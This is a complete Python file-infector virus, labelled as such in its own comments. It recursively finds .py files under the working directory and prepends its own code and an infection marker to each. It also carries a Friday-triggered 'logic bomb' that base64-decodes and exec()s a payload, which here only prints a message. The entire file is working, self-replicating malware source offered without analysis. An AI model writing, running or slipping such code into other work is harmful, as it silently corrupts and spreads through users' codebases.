# VIRUS SAYS HI!

import glob
import os
import datetime
import base64

VIRUS_SIGNATURE = "# ~infected_by_complex_virus~"

def get_virus_code():
    virus_code = []
    in_virus = False
    with open(__file__, 'r') as f:
        for line in f:
            if line.strip() == "# VIRUS SAYS HI!":
                in_virus = True
            if in_virus:
                virus_code.append(line)
            if line.strip() == "# VIRUS SAYS BYE!":
                break
    return virus_code

def find_python_files(path="."):
    python_files = []
    for root, dirs, files in os.walk(path):
        for file in files:
            if file.endswith(".py") and file != os.path.basename(__file__):
                python_files.append(os.path.join(root, file))
    return python_files

def is_already_infected(file):
    with open(file, 'r') as f:
        return VIRUS_SIGNATURE in f.read()

def infect_files(virus_code):
    files = find_python_files()
    for file in files:
        if not is_already_infected(file):
            with open(file, 'r') as f:
                original_code = f.read()
            with open(file, 'w') as f:
                f.writelines(virus_code)
                f.write("\n" + VIRUS_SIGNATURE + "\n")
                f.write(original_code)

def run_payload():
    # Only run on Friday as logic bomb
    if datetime.datetime.today().weekday() == 4:  # 0 = Monday ... 4 = Friday
        payload = base64.b64decode("cHJpbnQoIkZyaWRheSBQYXlsb2FkIEFjdGl2YXRlZCEiKQ==").decode()
        exec(payload)

if __name__ == "__main__":
    code = get_virus_code()
    infect_files(code)
    run_payload()

# VIRUS SAYS BYE!
